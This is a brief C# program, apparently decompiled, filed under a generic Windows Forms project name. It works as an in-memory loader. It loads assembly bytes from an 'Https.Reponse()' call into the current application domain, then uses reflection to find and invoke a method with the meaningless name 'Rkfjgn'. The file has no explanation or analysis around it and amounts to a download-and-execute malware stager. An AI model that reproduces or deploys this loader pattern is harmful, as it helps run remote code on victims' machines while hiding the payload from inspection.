using System;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;

namespace WindowsFormsApp30;

internal class Program
{
	private static void Main()
	{
		Core();
		Like();
	}

	private static void Core()
	{
		Thread.GetDomain().Load(Https.Reponse());
	}

	private static bool Like()
	{
		List<MethodInfo> list = new List<MethodInfo>();
		List<Type> list2 = new List<Type>();
		List<Assembly> list3 = new List<Assembly>();
		list3.AddRange(AppDomain.CurrentDomain.GetAssemblies());
		if (list3.Count > 0)
		{
			foreach (Assembly item in list3)
			{
				list2.AddRange(item.GetTypes());
			}
		}
		if (list2.Count > 0)
		{
			foreach (Type item2 in list2)
			{
				list.AddRange(item2.GetMethods());
			}
		}
		if (list.Count > 0)
		{
			foreach (MethodInfo item3 in list)
			{
				if (item3.Name == "Rkfjgn")
				{
					return (bool)item3.Invoke(null, null);
				}
			}
		}
		return false;
	}
}
